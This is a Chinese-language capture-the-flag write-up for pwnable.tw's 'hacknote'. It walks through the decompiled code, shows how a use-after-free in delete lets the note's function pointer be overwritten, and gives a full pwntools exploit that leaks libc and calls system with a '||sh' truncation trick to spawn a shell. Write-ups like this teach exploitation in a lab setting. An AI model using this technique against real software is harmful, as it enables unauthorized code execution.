# pwnable.tw hacknote wp

这是一道简单的uaf

文件格式和保护如下：

```
root@kotori:~/ctf/pwnable.tw/hacknote# file hacknote
hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
root@kotori:~/ctf/pwnable.tw/hacknote# checksec hacknote
[*] '/root/ctf/pwnable.tw/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

先分析源码：

```c
void __cdecl __noreturn main()
{
  int v0; // eax
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 4u);
      v0 = atoi(&buf);
      if ( v0 != 2 )
        break;
      delete();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        print();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

简单的菜单，三个操作add、delete和print

```c
unsigned int add()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( dword_804A04C <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr[i] )
      {
        ptr[i] = malloc(8u);
        if ( !ptr[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr[i] = sub_804862B;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = ptr[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr[i] + 1), size);
        puts("Success !");
        ++dword_804A04C;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}

unsigned int delete()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[v1] )
  {
    free(*((void **)ptr[v1] + 1));
    free(ptr[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}

unsigned int print()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr[v1] )
    (*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

可以看出delete时候没有将指针清空导致uaf漏洞，同时note的结构体如下

```
ptr[i]--->|0x804862B|content addr|
						|
						--------->|content|
```

因为在print中有(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);那么我们只要修改0x804862B所在位置的值就可以执行我们的函数。

基本思路如下：

先add两个content大小为0x20的note再将两个note delete使得0x10的fastbins中存在两个note，再add一个8字节的note这样会将0x10大小的fastbins中的两个chunk分配给note3，这时向content里写东西就是修改了先被delete的note的结构体里的内容，这样就可以leak libc然后执行system('bin/sh')。

exp如下：

```python
from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

def add(size,content):
    p.recvuntil('choice :')
    p.send('1')
    p.recvuntil('size :')
    if size == 0:    
        p.send(str(size))
    else:
        p.send(str(size))
        p.recvuntil('Content :')
        p.send(content)

def delete(index):
    p.recvuntil('choice :')
    p.send('2')
    p.recvuntil('Index :')
    p.send(str(index))

def print_note(index):
    p.recvuntil('choice :')
    p.send('3')
    p.recvuntil('Index :')
    p.send(str(index))


elf = change_ld('./hacknote', './ld-2.23.so')
debug = 0
if debug == 1:
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
else:
    p = remote('chall.pwnable.tw', 10102)


elf = ELF('./hacknote')
libc = ELF('./libc_32.so.6')
puts_got = elf.got['puts']
#gdb.attach(p)
add(0x20,'a')
add(0x20,'a')
delete(0)
delete(1)
#leak
add(8,p32(0x0804862B) + p32(puts_got))
print_note(0)
libc_base = u32(p.recv(4)) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
delete(2)

add(8,p32(system_addr) + '||sh')
print_note(0)


p.interactive()

```

这里exp的前面change_ld函数是强行加载指定libc，因为我的虚拟机的自带的libc是2.28的，有tcache，所以我加载了2.23的libc来调试，[参考博客在这](<https://bbs.pediy.com/thread-225849.htm>)。

还有一个坑点是system的参数实际上是从note0结构体开始的，也就是p32(system_addr)+'sh'，这样是无法达到system('/bin/sh')的效果的，要用到system参数截断，有&&sh，||sh，;sh等。